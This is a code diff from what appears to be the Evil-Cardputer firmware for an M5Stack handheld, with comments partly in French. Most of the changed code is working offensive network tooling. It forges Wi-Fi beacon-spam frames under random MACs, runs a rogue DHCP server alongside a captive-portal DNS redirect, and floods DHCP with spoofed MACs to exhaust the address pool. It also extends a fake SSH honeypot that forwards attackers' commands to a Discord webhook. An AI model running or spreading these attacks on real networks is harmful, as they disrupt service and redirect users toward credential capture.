-        Serial.println();
-
-        generateRandomWiFiMac(macAddr);
-        memcpy(&beaconPacket[10], macAddr, 6); // Source MAC address
+        memcpy(&beaconPacket[10], macAddr, 6); // Source MAC
         memcpy(&beaconPacket[16], macAddr, 6); // BSSID
 
-        memset(&beaconPacket[38], 0, 32);
+        memset(&beaconPacket[38], 0x20, 32);
         memcpy(&beaconPacket[38], &list[i], ssidLen);
+        beaconPacket[37] = ssidLen;
 
-        beaconPacket[37] = ssidLen; // SSID length
-        beaconPacket[82] = wifi_channel; // Wi-Fi channel
+        // DS Parameter Set juste après SSID
+        uint8_t dsPos = 38 + ssidLen;
+        beaconPacket[dsPos]     = 0x03;
+        beaconPacket[dsPos + 1] = 0x01;
+        beaconPacket[dsPos + 2] = wifi_channel;
+
+        size_t beaconPacketSize = 38 + ssidLen + 9 + 3;
 
         for (int k = 0; k < 3; k++) {
-            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
+            uint64_t timestamp = esp_timer_get_time();
+            memcpy(&beaconPacket[24], &timestamp, sizeof(timestamp));
+
+            sequenceNumber = (sequenceNumber + 0x10) & 0xFFF0;
+            beaconPacket[22] = sequenceNumber & 0xFF;
+            beaconPacket[23] = (sequenceNumber >> 8) & 0xFF;
+
+            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, beaconPacketSize, false);
             delay(1);
         }
         i += j;
-
-        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-            break;
-        }
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) break;
     }
-
     Serial.println("Finished beaconSpamList.");
 }
 
@@ -6738,14 +6797,17 @@ void beaconAttack() {
             previousMillis = currentMillis;
 
             if (useCustomBeacons && !customBeacons.empty()) {
-                for (const auto& ssid : customBeacons) {
-                    beaconSpamList(ssid.c_str(), ssid.length());
-                }
+              for (const auto& ssid : customBeacons) {
+                  uint8_t macAddr[6];
+                  generateRandomWiFiMac(macAddr);  // une MAC unique pour ce SSID
+                  beaconSpamList(ssid.c_str(), ssid.length(), macAddr);
+              }
             } else {
-                char *randomSSIDName = randomSSID();
-                beaconSpamList(randomSSIDName, strlen(randomSSIDName));
+                  char *randomSSIDName = randomSSID();
+                  uint8_t macAddr[6];
+                  generateRandomWiFiMac(macAddr);
+                  beaconSpamList(randomSSIDName, strlen(randomSSIDName), macAddr);
             }
-
             beaconCount++;
         }
 
@@ -6762,9 +6824,6 @@ void beaconAttack() {
     restoreOriginalWiFiSettings();
     waitAndReturnToMenu("Beacon Spam Stopped..");
 }
-
-
-// beacon attack end 
 
 
 // Set wifi and password ssid
@@ -10678,7 +10737,7 @@ int totalNetworks = 0;
 unsigned long lastLog = 0;
 int currentScreen = 1;  // Track which screen is currently displayed
 
-const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.3.9,model=Cardputer,release=v1.3.9,device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
+const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.4.0,model=Cardputer,release=v1.4.0,device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
     "MAC", "SSID", "AuthMode", "FirstSeen", "Channel", "RSSI", "CurrentLatitude", "CurrentLongitude", "AltitudeMeters", "AccuracyMeters", "Type"
@@ -12696,7 +12755,10 @@ void rogueDHCP() {
   currentDNSRogue = WiFi.localIP();
 
   initClients(); // Initialize client info
-
+  if (isCaptivePortalOn) {
+    dnsServer.stop();  // stop temporary DNS to free port 53
+    delay(100);
+  }
   if (!udp.begin(localUdpPort)) {
     Serial.println("Error: UDP port 67 start failed.");
     waitAndReturnToMenu("Error: UDP start failed.");
@@ -12749,6 +12811,9 @@ void rogueDHCP() {
         updateDisplay("ACK sent.");
       }
     }
+  }
+  if (isCaptivePortalOn) {
+    dnsServer.start(53, "*", WiFi.softAPIP()); // restart DNS redirect
   }
 }
 
@@ -13054,6 +13119,8 @@ IPAddress broadcastIP(255, 255, 255, 255);
 uint8_t macBase[6] = {0xAE, 0xAD, 0xBE, 0xEF, 0x00, 0x00};
 IPAddress dhcpServerIP;
 bool dhcpServerDetected = false;
+#define DHCP_BUFFER_SIZE 1024
+const char* vendorClass   = "EvilClient";
 
 unsigned int localUdpPortStarvation = 67;
 
@@ -13181,48 +13248,50 @@ void detectDHCPServer() {
             return;
         }
 
-        sendDHCPDiscover(macBase); // Send DHCP Discover request
+           sendDHCPDiscover(macBase); // envoi Discover
 
-        // Wait for response for 5 seconds
-        unsigned long responseStartMillis = millis();
-        while (millis() - responseStartMillis < 5000) {
+          // Attente 5s pour la réponse
+          unsigned long responseStartMillis = millis();
+          while (millis() - responseStartMillis < 5000) {
             int packetSize = udp.parsePacket();
             if (packetSize > 0) {
-                uint8_t packetBuffer[512];
-                udp.read(packetBuffer, packetSize);
-
-                uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
-                if (messageType == 2) { // DHCP Offer
-                    dhcpServerIP = IPAddress(packetBuffer[20], packetBuffer[21], packetBuffer[22], packetBuffer[23]);
-                    
-                    // Check if the detected DHCP server is 0.0.0.0
-                    if (dhcpServerIP.toString() == "0.0.0.0") {
-                        Serial.println("DHCP server detected as 0.0.0.0. Using gateway as fallback.");
-                        dhcpServerIP = currentGateway;
-                    }
-
-                    Serial.printf("DHCP server detected: %s\n", dhcpServerIP.toString().c_str());
-                    M5.Display.printf("DHCP server found:\n%s\n", dhcpServerIP.toString().c_str());
-                    M5.Display.display();
-                    dhcpServerDetected = true;
-                    delay(2000);
-                    return; // DHCP server found
+              uint8_t packetBuffer[DHCP_BUFFER_SIZE];
+              int readLen = min(packetSize, (int)sizeof(packetBuffer));
+              udp.read(packetBuffer, readLen);
+      
+              uint8_t messageType = parseDHCPMessageType(packetBuffer, readLen);
+              if (messageType == 2) { // DHCP Offer
+                // yiaddr = offset 16..19
+                dhcpServerIP = IPAddress(packetBuffer[20], packetBuffer[21], 
+                                         packetBuffer[22], packetBuffer[23]);
+                // Vérif 0.0.0.0
+                if (dhcpServerIP.toString() == "0.0.0.0") {
+                  Serial.println("DHCP server detected as 0.0.0.0. Using gateway as fallback.");
+                  dhcpServerIP = currentGateway;
                 }
+                
+                Serial.printf("DHCP server detected: %s\n", dhcpServerIP.toString().c_str());
+                M5.Display.printf("DHCP server found:\n%s\n", dhcpServerIP.toString().c_str());
+                M5.Display.display();
+                dhcpServerDetected = true;
+                delay(2000);
+                return;
+              }
             }
+          }
         }
-    }
-
-    if (!dhcpServerDetected) {
-        // Fallback to using the gateway as the DHCP server
-        dhcpServerIP = currentGateway;
-        Serial.println("No DHCP server detected. Using gateway as fallback.");
-        M5.Display.clear(menuBackgroundColor);
-        M5.Display.println("No DHCP server found.");
-        M5.Display.println("Using gateway as fallback:");
-        M5.Display.printf("Gateway: %s\n", dhcpServerIP.toString().c_str());
-        M5.Display.display();
-        delay(2000);
-    }
+      
+        // Aucune offre, fallback
+        if (!dhcpServerDetected) {
+          dhcpServerIP = currentGateway;
+          Serial.println("No DHCP server detected. Using gateway as fallback.");
+          M5.Display.clear(BLACK);
+          M5.Display.println("No DHCP server found.");
+          M5.Display.println("Using gateway as fallback:");
+          M5.Display.printf("Gateway: %s\n", dhcpServerIP.toString().c_str());
+          M5.Display.display();
+          delay(2000);
+        }
 }
 
 
@@ -13415,237 +13484,276 @@ void generateRandomMAC(uint8_t *mac, uint16_t iteration) {
 const char* fixedHostname = "Evil-Client";
 
 void sendDHCPDiscover(uint8_t *mac) {
-    uint8_t dhcpDiscover[300] = {0};
-    int index = 0;
+  // Préparation d’un buffer local
+  uint8_t dhcpDiscover[300] = {0};
+  int index = 0;
 
-    // Ethernet Header
-    dhcpDiscover[index++] = 0x01; // OP: BOOTREQUEST
-    dhcpDiscover[index++] = 0x01; // HTYPE: Ethernet
-    dhcpDiscover[index++] = 0x06; // HLEN: MAC address length
-    dhcpDiscover[index++] = 0x00; // HOPS: 0
+  // Champ BOOTP de base
+  dhcpDiscover[index++] = 0x01; // OP: BOOTREQUEST
+  dhcpDiscover[index++] = 0x01; // HTYPE: Ethernet
+  dhcpDiscover[index++] = 0x06; // HLEN: longueur MAC
+  dhcpDiscover[index++] = 0x00; // HOPS
 
-    // Transaction ID
-    uint32_t xid = random(1, 0xFFFFFFFF); // Ensure xid is not zero
-    dhcpDiscover[index++] = (xid >> 24) & 0xFF;
-    dhcpDiscover[index++] = (xid >> 16) & 0xFF;
-    dhcpDiscover[index++] = (xid >> 8) & 0xFF;
-    dhcpDiscover[index++] = xid & 0xFF;
+  // Transaction ID aléatoire
+  uint32_t xid = random(1, 0xFFFFFFFF); 
+  dhcpDiscover[index++] = (xid >> 24) & 0xFF;
+  dhcpDiscover[index++] = (xid >> 16) & 0xFF;
+  dhcpDiscover[index++] = (xid >> 8)  & 0xFF;
+  dhcpDiscover[index++] = (xid)       & 0xFF;
 
-    // Seconds and Flags
-    dhcpDiscover[index++] = 0x00; // Seconds
+  // Seconds et flags
+  dhcpDiscover[index++] = 0x00; 
+  dhcpDiscover[index++] = 0x00;
+  dhcpDiscover[index++] = 0x80; // Broadcast flag
+  dhcpDiscover[index++] = 0x00;
+
+  // ciaddr, yiaddr, siaddr, giaddr = 0
+  for (int i = 0; i < 16; i++) {
     dhcpDiscover[index++] = 0x00;
-    dhcpDiscover[index++] = 0x80; // Flags (Broadcast)
+  }
+
+  // Client MAC
+  for (int i = 0; i < 6; i++) {
+    dhcpDiscover[index++] = mac[i];
+  }
+  // Remplir le champ chaddr sur 16 octets au total
+  for (int i = 0; i < 10; i++) {
     dhcpDiscover[index++] = 0x00;
+  }
 
-    // IP Addresses (ciaddr, yiaddr, siaddr, giaddr)
-    for (int i = 0; i < 16; i++) {
-        dhcpDiscover[index++] = 0x00;
-    }
+  // sname (64 octets) + file (128 octets)
+  for (int i = 0; i < 64; i++) {
+    dhcpDiscover[index++] = 0x00;
+  }
+  for (int i = 0; i < 128; i++) {
+    dhcpDiscover[index++] = 0x00;
+  }
 
-    // Client MAC Address (chaddr)
-    for (int i = 0; i < 6; i++) {
-        dhcpDiscover[index++] = mac[i];
-    }
-    for (int i = 0; i < 10; i++) {
-        dhcpDiscover[index++] = 0x00; // Padding to make chaddr 16 bytes
-    }
+  // Magic cookie
+  dhcpDiscover[index++] = 0x63;
+  dhcpDiscover[index++] = 0x82;
+  dhcpDiscover[index++] = 0x53;
+  dhcpDiscover[index++] = 0x63;
 
-    // sname: Server Host Name (64 bytes)
-    for (int i = 0; i < 64; i++) {
-        dhcpDiscover[index++] = 0x00;
-    }
+  // Option 53: DHCP Discover
+  dhcpDiscover[index++] = 53;
+  dhcpDiscover[index++] = 1;
+  dhcpDiscover[index++] = 1; // DHCP Discover
 
-    // file: Boot File Name (128 bytes)
-    for (int i = 0; i < 128; i++) {
-        dhcpDiscover[index++] = 0x00;
-    }
+  // Option 61: Client Identifier (type 0x01 + MAC)
+  dhcpDiscover[index++] = 61;
+  dhcpDiscover[index++] = 7;    // 1 + 6 (hwtype + MAC)
+  dhcpDiscover[index++] = 0x01; // hardware type Ethernet
+  for (int i=0; i<6; i++) {
+    dhcpDiscover[index++] = mac[i];
+  }
 
-    // DHCP Magic Cookie
-    dhcpDiscover[index++] = 0x63;
-    dhcpDiscover[index++] = 0x82;
-    dhcpDiscover[index++] = 0x53;
-    dhcpDiscover[index++] = 0x63;
+  // Option 60: Vendor Class Identifier
+  dhcpDiscover[index++] = 60;
+  dhcpDiscover[index++] = strlen(vendorClass);
+  for (size_t i = 0; i < strlen(vendorClass); i++) {
+    dhcpDiscover[index++] = vendorClass[i];
+  }
 
-    // DHCP Options
-    dhcpDiscover[index++] = 53; // DHCP Message Type Option
-    dhcpDiscover[index++] = 1;  // Length
-    dhcpDiscover[index++] = 1;  // DHCP Discover
+  // Option 12: Host Name
+  dhcpDiscover[index++] = 12;
+  dhcpDiscover[index++] = strlen(fixedHostname);
+  for (size_t i = 0; i < strlen(fixedHostname); i++) {
+    dhcpDiscover[index++] = fixedHostname[i];
+  }
 
-    // Host Name Option (12)
-    dhcpDiscover[index++] = 12;               // Option 12: Host Name
-    dhcpDiscover[index++] = strlen(fixedHostname); // Length of the host name
-    for (size_t i = 0; i < strlen(fixedHostname); i++) {
-        dhcpDiscover[index++] = fixedHostname[i];  // Add the host name characters
-    }
+  // Option 55: Parameter Request List
+  dhcpDiscover[index++] = 55; 
+  dhcpDiscover[index++] = 4;  
+  dhcpDiscover[index++] = 1;  // Subnet Mask
+  dhcpDiscover[index++] = 3;  // Router
+  dhcpDiscover[index++] = 6;  // DNS
+  dhcpDiscover[index++] = 15; // Domain Name
 
+  // End option
+  dhcpDiscover[index++] = 255; 
 
-    dhcpDiscover[index++] = 55; // Parameter Request List
-    dhcpDiscover[index++] = 4;  // Length
-    dhcpDiscover[index++] = 1;  // Subnet Mask
-    dhcpDiscover[index++] = 3;  // Router
-    dhcpDiscover[index++] = 6;  // DNS Server
-    dhcpDiscover[index++] = 15; // Domain Name
-    dhcpDiscover[index++] = 255; // End Option
-
-    // Send the packet
-    if (udp.beginPacket(broadcastIP, 67)) {
-        udp.write(dhcpDiscover, index);
-        udp.endPacket();
-        discoverCount++;
-        Serial.println("Sent DHCP Discover with Host Name...");
-    } else {
-        Serial.println("Failed to send DHCP Discover.");
-        M5.Display.setCursor(0, M5.Display.height() - 40);
-        M5.Display.println("Failed to send DHCP Discover");
-        M5.Display.display();
-    }
+  // Envoi du paquet
+  if (udp.beginPacket(broadcastIP, 67)) {
+    udp.write(dhcpDiscover, index);
+    udp.endPacket();
+    discoverCount++;
+    Serial.println("Sent DHCP Discover with Host Name + Options...");
+  } else {
+    Serial.println("Failed to send DHCP Discover.");
+    M5.Display.setCursor(0, M5.Display.height() - 40);
+    M5.Display.println("Failed to send DHCP Discover");
+    M5.Display.display();
+  }
 }
 
 void sendDHCPRequest(uint8_t *mac, IPAddress offeredIP, IPAddress dhcpServerIP) {
-    uint8_t dhcpRequest[300] = {0};
-    int index = 0;
+  uint8_t dhcpRequest[300] = {0};
+  int index = 0;
 
-    // Ethernet Header
-    dhcpRequest[index++] = 0x01; // OP: BOOTREQUEST
-    dhcpRequest[index++] = 0x01; // HTYPE: Ethernet
-    dhcpRequest[index++] = 0x06; // HLEN: MAC address length
-    dhcpRequest[index++] = 0x00; // HOPS: 0
+  // BOOTP
+  dhcpRequest[index++] = 0x01; // BOOTREQUEST
+  dhcpRequest[index++] = 0x01; // Ethernet
+  dhcpRequest[index++] = 0x06; // HLEN
+  dhcpRequest[index++] = 0x00; // HOPS
 
-    // Transaction ID
-    uint32_t xid = random(1, 0xFFFFFFFF); // Unique transaction ID
-    dhcpRequest[index++] = (xid >> 24) & 0xFF;
-    dhcpRequest[index++] = (xid >> 16) & 0xFF;
-    dhcpRequest[index++] = (xid >> 8) & 0xFF;
-    dhcpRequest[index++] = xid & 0xFF;
+  // Transaction ID
+  uint32_t xid = random(1, 0xFFFFFFFF); 
+  dhcpRequest[index++] = (xid >> 24) & 0xFF;
+  dhcpRequest[index++] = (xid >> 16) & 0xFF;
+  dhcpRequest[index++] = (xid >> 8)  & 0xFF;
+  dhcpRequest[index++] =  xid        & 0xFF;
 
-    // Seconds and Flags
-    dhcpRequest[index++] = 0x00; // Seconds
+  // Seconds + Flags
+  dhcpRequest[index++] = 0x00;
+  dhcpRequest[index++] = 0x00;
+  dhcpRequest[index++] = 0x80; // Broadcast
+  dhcpRequest[index++] = 0x00;
+
+  // ciaddr, yiaddr, siaddr, giaddr = 0
+  for (int i = 0; i < 16; i++) {
     dhcpRequest[index++] = 0x00;
-    dhcpRequest[index++] = 0x80; // Flags (Broadcast)
+  }
+  
+  // Client MAC
+  for (int i = 0; i < 6; i++) {
+    dhcpRequest[index++] = mac[i];
+  }
+  for (int i = 0; i < 10; i++) {
     dhcpRequest[index++] = 0x00;
+  }
 
-    // IP Addresses (ciaddr, yiaddr, siaddr, giaddr)
-    for (int i = 0; i < 16; i++) {
-        dhcpRequest[index++] = 0x00;
-    }
+  // sname + file
+  for (int i = 0; i < 64; i++) {
+    dhcpRequest[index++] = 0x00;
+  }
+  for (int i = 0; i < 128; i++) {
+    dhcpRequest[index++] = 0x00;
+  }
 
-    // Client MAC Address (chaddr)
-    for (int i = 0; i < 6; i++) {
-        dhcpRequest[index++] = mac[i];
-    }
-    for (int i = 0; i < 10; i++) {
-        dhcpRequest[index++] = 0x00; // Padding to make chaddr 16 bytes
-    }
+  // Magic cookie
+  dhcpRequest[index++] = 0x63;
+  dhcpRequest[index++] = 0x82;
+  dhcpRequest[index++] = 0x53;
+  dhcpRequest[index++] = 0x63;
 
-    // sname: Server Host Name (64 bytes)
-    for (int i = 0; i < 64; i++) {
-        dhcpRequest[index++] = 0x00;
-    }
+  // Option 53: DHCP Request
+  dhcpRequest[index++] = 53;
+  dhcpRequest[index++] = 1;
+  dhcpRequest[index++] = 3; // DHCP Request
 
-    // file: Boot File Name (128 bytes)
-    for (int i = 0; i < 128; i++) {
-        dhcpRequest[index++] = 0x00;
-    }
+  // Option 50: Requested IP
+  dhcpRequest[index++] = 50;
+  dhcpRequest[index++] = 4;
+  dhcpRequest[index++] = offeredIP[0];
+  dhcpRequest[index++] = offeredIP[1];
+  dhcpRequest[index++] = offeredIP[2];
+  dhcpRequest[index++] = offeredIP[3];
 
-    // DHCP Magic Cookie
-    dhcpRequest[index++] = 0x63;
-    dhcpRequest[index++] = 0x82;
-    dhcpRequest[index++] = 0x53;
-    dhcpRequest[index++] = 0x63;
+  // Option 54: Server Identifier
+  dhcpRequest[index++] = 54;
+  dhcpRequest[index++] = 4;
+  dhcpRequest[index++] = dhcpServerIP[0];
+  dhcpRequest[index++] = dhcpServerIP[1];
+  dhcpRequest[index++] = dhcpServerIP[2];
+  dhcpRequest[index++] = dhcpServerIP[3];
 
-    // DHCP Options
-    dhcpRequest[index++] = 53; // DHCP Message Type Option
-    dhcpRequest[index++] = 1;  // Length
-    dhcpRequest[index++] = 3;  // DHCP Request
+  // Option 61: Client Identifier
+  dhcpRequest[index++] = 61;
+  dhcpRequest[index++] = 7;   
+  dhcpRequest[index++] = 0x01; // hardware type
+  for (int i=0; i<6; i++) {
+    dhcpRequest[index++] = mac[i];
+  }
 
-    // Requested IP Address Option
-    dhcpRequest[index++] = 50; // Requested IP Address
-    dhcpRequest[index++] = 4;  // Length
-    dhcpRequest[index++] = offeredIP[0];
-    dhcpRequest[index++] = offeredIP[1];
-    dhcpRequest[index++] = offeredIP[2];
-    dhcpRequest[index++] = offeredIP[3];
+  // Option 60: Vendor Class
+  dhcpRequest[index++] = 60;
+  dhcpRequest[index++] = strlen(vendorClass);
+  for (size_t i = 0; i < strlen(vendorClass); i++) {
+    dhcpRequest[index++] = vendorClass[i];
+  }
 
-    // DHCP Server Identifier Option
-    dhcpRequest[index++] = 54; // DHCP Server Identifier
-    dhcpRequest[index++] = 4;  // Length
-    dhcpRequest[index++] = dhcpServerIP[0];
-    dhcpRequest[index++] = dhcpServerIP[1];
-    dhcpRequest[index++] = dhcpServerIP[2];
-    dhcpRequest[index++] = dhcpServerIP[3];
+  // Option 12: Host Name
+  dhcpRequest[index++] = 12;
+  dhcpRequest[index++] = strlen(fixedHostname);
+  for (size_t i = 0; i < strlen(fixedHostname); i++) {
+    dhcpRequest[index++] = fixedHostname[i];
+  }
 
-    // Host Name Option (12)
-    dhcpRequest[index++] = 12;               // Option 12: Host Name
-    dhcpRequest[index++] = strlen(fixedHostname); // Length of the host name
-    for (size_t i = 0; i < strlen(fixedHostname); i++) {
-        dhcpRequest[index++] = fixedHostname[i];  // Add the host name characters
-    }
-    
-    dhcpRequest[index++] = 255; // End Option
+  // End
+  dhcpRequest[index++] = 255; 
 
-    // Send the packet
-    if (udp.beginPacket(broadcastIP, 67)) {
-        udp.write(dhcpRequest, index);
-        udp.endPacket();
-        requestCount++;
-        Serial.println("Sent DHCP Request with Host Name...");
-    } else {
-        Serial.println("Failed to send DHCP Request.");
-        M5.Display.setCursor(0, M5.Display.height() - 40);
-        M5.Display.println("Failed to send DHCP Request");
-        M5.Display.display();
-    }
+  // Envoi
+  if (udp.beginPacket(broadcastIP, 67)) {
+    udp.write(dhcpRequest, index);
+    udp.endPacket();
+    requestCount++;
+    Serial.println("Sent DHCP Request with Host Name + Options...");
+  } else {
+    Serial.println("Failed to send DHCP Request.");
+    M5.Display.setCursor(0, M5.Display.height() - 40);
+    M5.Display.println("Failed to send DHCP Request");
+    M5.Display.display();
+  }
 }
 
 // Complete DHCP Transaction
 void completeDHCPTransaction(uint8_t *mac) {
-    sendDHCPDiscover(mac);
-    Serial.println("DHCP Discover sent. Waiting for DHCP Offer...");
+  // Envoie Discover
+  sendDHCPDiscover(mac);
+  Serial.println("DHCP Discover sent. Waiting for DHCP Offer...");
 
-    unsigned long offerWaitStart = millis();
-    while (millis() - offerWaitStart < 2000) {
-        int packetSize = udp.parsePacket();
-        if (packetSize > 0) {
-            uint8_t packetBuffer[512];
-            udp.read(packetBuffer, packetSize);
+  unsigned long offerWaitStart = millis();
+  while (millis() - offerWaitStart < 3000) { // passé de 2000 -> 3000ms
+    int packetSize = udp.parsePacket();
+    if (packetSize > 0) {
+      uint8_t packetBuffer[DHCP_BUFFER_SIZE];
+      int readLen = min(packetSize, (int)sizeof(packetBuffer));
+      udp.read(packetBuffer, readLen); // Evite out-of-bounds
 
-            uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
-            if (messageType == 6) { // DHCP NAK
-                nakCount++;
-                Serial.println("Received DHCP NAK");
-                return;
-          } else if (messageType == 2) { // DHCP Offer
-                offerCount++;
-                IPAddress offeredIP(packetBuffer[16], packetBuffer[17], packetBuffer[18], packetBuffer[19]);
-                Serial.printf("Offered IP: %s\n", offeredIP.toString().c_str());
-                lastAssignedIP = offeredIP;
+      uint8_t messageType = parseDHCPMessageType(packetBuffer, readLen);
+      if (messageType == 6) { // DHCP NAK
+        nakCount++;
+        Serial.println("Received DHCP NAK");
+        return;
+      } 
+      else if (messageType == 2) { // DHCP Offer
+        offerCount++;
+        // yiaddr = offset 16..19
+        IPAddress offeredIP(packetBuffer[16], packetBuffer[17], 
+                            packetBuffer[18], packetBuffer[19]);
+        Serial.printf("Offered IP: %s\n", offeredIP.toString().c_str());
+        lastAssignedIP = offeredIP;
 
-                sendDHCPRequest(mac, offeredIP, dhcpServerIP);
+        // On envoie le Request
+        sendDHCPRequest(mac, offeredIP, dhcpServerIP);
 
-                unsigned long ackWaitStart = millis();
-                while (millis() - ackWaitStart < 2000) {
-                    int ackPacketSize = udp.parsePacket();
-                    if (ackPacketSize > 0) {
-                        udp.read(packetBuffer, ackPacketSize);
+        // Attente ACK
+        unsigned long ackWaitStart = millis();
+        while (millis() - ackWaitStart < 3000) {
+          int ackPacketSize = udp.parsePacket();
+          if (ackPacketSize > 0) {
+            int ackReadLen = min(ackPacketSize, (int)sizeof(packetBuffer));
+            udp.read(packetBuffer, ackReadLen);
 
-                        uint8_t ackMessageType = parseDHCPMessageType(packetBuffer, ackPacketSize);
-                        if (ackMessageType == 5) { // DHCP ACK
-                            ackCount++;
-                            Serial.printf("IP successfully assigned: %s\n", offeredIP.toString().c_str());
-                            return;
-                        } else if (ackMessageType == 6) { // DHCP NAK
-                            nakCount++;
-                            Serial.println("Received DHCP NAK");
-                            return;
-                        }
-                    }
-                }
-                Serial.println("No DHCP ACK received.");
-                return;
+            uint8_t ackMessageType = parseDHCPMessageType(packetBuffer, ackReadLen);
+            if (ackMessageType == 5) { // DHCP ACK
+              ackCount++;
+              Serial.printf("IP successfully assigned: %s\n", offeredIP.toString().c_str());
+              return;
+            } else if (ackMessageType == 6) { // DHCP NAK
+              nakCount++;
+              Serial.println("Received DHCP NAK");
+              return;
             }
+          }
         }
+        Serial.println("No DHCP ACK received.");
+        return;
+      }
     }
-    Serial.println("No DHCP Offer received.");
+  }
+  Serial.println("No DHCP Offer received.");
 }
 
 // DHCP packet analysis
@@ -14554,6 +14662,7 @@ void honeypotLoop() {
 String logBuffer[MAX_LOG_LINES]; // Buffer circulaire pour les logs
 int currentLogIndex = 0; // Index du prochain emplacement dans le buffer
 
+
 // -- Log commands and credentials to a file on SD and display on screen with scrolling --
 void logHoneypotCommand(String clientIP, String command) {
     File logFile = SD.open(honeypotLogFile, FILE_APPEND);
@@ -14562,26 +14671,42 @@ void logHoneypotCommand(String clientIP, String command) {
         return;
     }
 
-    // Créer une entrée log avec timestamp
     String logEntry = "[" + String(millis()) + "] ";
     logEntry += "IP: " + clientIP + " - Command: " + command;
     logFile.println(logEntry);
     logFile.close();
 
-    // Afficher dans le terminal série
     Serial.println("------------------");
     Serial.println("IP: " + clientIP);
     Serial.println("Command: " + command);
     Serial.println("------------------");
 
-    // Ajouter au buffer circulaire pour affichage
+    // Ajout au buffer circulaire
     String formattedLog = "IP: " + clientIP + "\n" + command + "\n------------------";
     logBuffer[currentLogIndex] = formattedLog;
-    currentLogIndex = (currentLogIndex + 1) % MAX_LOG_LINES; // Gestion du buffer circulaire
+    currentLogIndex = (currentLogIndex + 1) % MAX_LOG_LINES;
 
-    // Redessiner l'écran avec les logs
     redrawScreenWithLogs();
+
+    // -- Envoi sur Discord --
+    if (WiFi.status() == WL_CONNECTED && discordWebhookURL.length() > 0) {
+        HTTPClient http;
+        http.begin(discordWebhookURL);
+        http.addHeader("Content-Type", "application/json");
+
+        String jsonPayload = "{\"content\":\"📡 **Honeypot Alert**\\n🔍 IP: " + clientIP + "\\n💻 Command: `" + command + "`\\n_____________________________________________\"}";
+
+        int httpResponseCode = http.POST(jsonPayload);
+
+        if (httpResponseCode > 0) {
+            Serial.println("Webhook Discord envoyé !");
+        } else {
+            Serial.println("Erreur envoi webhook Discord : " + String(httpResponseCode));
+        }
+        http.end();
+    }
 }
+
 
 // -- Helper function to redraw the screen with all logs in the buffer --
 void redrawScreenWithLogs() {
@@ -14623,7 +14748,8 @@ void handleHoneypotClient(WiFiClient client) {
     String currentDirectory = "/home/pi";
     String prompt = "pi@ubuntu:~$ ";
   
-    while (client.connected()) {
+    while (client.connected() || !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      M5Cardputer.update();
       client.print(prompt);
       String command = readLine(client, false); // on ne renvoie jamais les caractères
       command.trim();
@@ -15093,16 +15219,67 @@ void handleHoneypotClient(WiFiClient client) {
         client.println("Chain OUTPUT (policy ACCEPT)");
         client.println("target     prot opt source               destination         ");
       }
-  
       //------------------------------------------------
-      // 9. Commande vide (juste Entrée)
+      // 9. Commande supplémentaire.
+      //------------------------------------------------
+      else if (command.equals("id")) {
+        client.println("uid=1000(pi) gid=1000(pi) groups=1000(pi)");
+      }
+      else if (command.equals("lsb_release -a")) {
+        client.println("Distributor ID: Ubuntu");
+        client.println("Description:    Ubuntu 20.04.5 LTS");
+        client.println("Release:        20.04");
+        client.println("Codename:       focal");
+      }
+      else if (command.equals("cat /etc/issue")) {
+        client.println("Ubuntu 20.04.5 LTS \\n \\l");
+      }
+      else if (command.equals("cat /proc/version")) {
+        client.println("Linux version 5.4.0-109-generic (buildd@lgw01-amd64-039) (gcc version 9.3.0, GNU ld version 2.34) #123-Ubuntu SMP");
+      }
+      else if (command.equals("cat /proc/cpuinfo")) {
+        client.println("processor   : 0");
+        client.println("vendor_id   : GenuineIntel");
+        client.println("cpu family  : 6");
+        client.println("model       : 158");
+        client.println("model name  : Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz");
+        client.println("stepping    : 10");
+        client.println("microcode   : 0xca");
+        client.println("cpu MHz     : 1992.000");
+        client.println("cache size  : 8192 KB");
+      }
+      else if (command.equals("lscpu")) {
+        client.println("Architecture:        x86_64");
+        client.println("CPU op-mode(s):      32-bit, 64-bit");
+        client.println("Byte Order:          Little Endian");
+        client.println("CPU(s):              4");
+        client.println("Vendor ID:           GenuineIntel");
+        client.println("Model name:          Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz");
+        client.println("CPU MHz:             1992.000");
+      }
+      else if (command.equals("dmesg")) {
+        client.println("[    0.000000] Booting Linux on physical CPU 0");
+        client.println("[    0.123456] Linux version 5.4.0-109-generic (buildd@lgw01-amd64-039) (gcc version 9.3.0, GNU ld version 2.34) #123-Ubuntu SMP");
+      }
+      else if (command.equals("last")) {
+        client.println("pi     pts/0        192.168.1.10    Wed Feb  3 12:00   still logged in");
+        client.println("reboot system boot  5.4.0-109-generic Wed Feb  3 11:55   still running");
+      }
+      else if (command.equals("finger pi")) {
+        client.println("Login: pi");
+        client.println("Name:  ");
+        client.println("Directory: /home/pi");
+        client.println("Shell: /bin/bash");
+      }
+      //------------------------------------------------
+      // 10. Commande vide (juste Entrée)
       //------------------------------------------------
       else if (command.length() == 0) {
         // Ne rien faire
       }
   
       //------------------------------------------------
-      // 10. Commande non reconnue
+      // 11. Commande non reconnue
       //------------------------------------------------
       else {
         client.println("bash: " + command + ": command not found");
@@ -15135,3 +15312,1331 @@ String readLine(WiFiClient &client, bool echo) {
     // Pas de gestion d'écho ici (pas de client.print)
     return line;
 }
+
+
+
+
+
+
+
+#include <USBMSC.h>
+#include "tusb.h" 
+
+// Objet USB MSC
+USBMSC usbMassStorage;
+
+// Instance SPI
+SPIClass spiInterface;
+
+// Broches de la carte SD
+constexpr int sdChipSelectPin = 12;
+constexpr int sdDataInPin   = 39;
+constexpr int sdDataOutPin  = 14;
+constexpr int sdClockPin    = 40;
+
+// Fonctions de lecture/écriture pour le stockage USB MSC
+int32_t handleUsbWrite(uint32_t logicalBlockAddr, uint32_t dataOffset, uint8_t* dataBuffer, uint32_t bufferSize) {
